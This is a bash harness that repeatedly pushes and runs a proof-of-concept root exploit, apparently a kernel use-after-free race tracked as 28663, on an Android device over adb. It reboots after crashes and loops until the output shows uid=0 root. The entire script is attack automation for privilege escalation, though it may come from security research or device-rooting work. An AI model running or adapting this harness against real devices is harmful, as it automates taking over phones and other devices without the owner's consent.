#!/bin/bash
# Grind the root exploit across reboots.
# The UAF replacement race crashes ~50% of attempts.
# The cache coherency issue may resolve on some runs (L2 eviction).
cd "$(dirname "$0")"
BIN=${1:-poc-28663/exploit_trona}
BASE=0x40080000
LIMIT=90
ATTEMPT=0
while true; do
	ATTEMPT=$((ATTEMPT + 1))
	echo "===== root attempt $ATTEMPT $(date +%H:%M:%S) ====="
	adb wait-for-device
	sleep 15
	adb push "$BIN" /data/local/tmp/exploit_trona >/dev/null 2>&1
	adb shell "cd /data/local/tmp && timeout $LIMIT ./exploit_trona $BASE root" > "root_attempt_${ATTEMPT}.log" 2>&1 &
	ADBPID=$!
	START=$SECONDS
	HUNG=0
	while kill -0 $ADBPID 2>/dev/null; do
		sleep 5
		if [ $((SECONDS - START)) -gt $((LIMIT + 90)) ]; then
			echo "  [watchdog] hung, rebooting"
			adb shell reboot >/dev/null 2>&1
			HUNG=1
			break
		fi
	done
	wait $ADBPID 2>/dev/null
	OUT=$(cat "root_attempt_${ATTEMPT}.log")
	echo "$OUT" | tail -30
	if echo "$OUT" | grep -qE "GOT ROOT|uid=0\(|uid=0$"; then
		echo "===== WIN at attempt $ATTEMPT ====="
		cp "root_attempt_${ATTEMPT}.log" "root_win_${ATTEMPT}.log"
		exit 0
	fi
	if echo "$OUT" | grep -qE "SPILL CONFIRMED"; then
		echo "  [info] spill confirmed but root not gained (cache issue?)"
	fi
	[ $HUNG -eq 0 ] && adb shell reboot >/dev/null 2>&1
	sleep 5
done
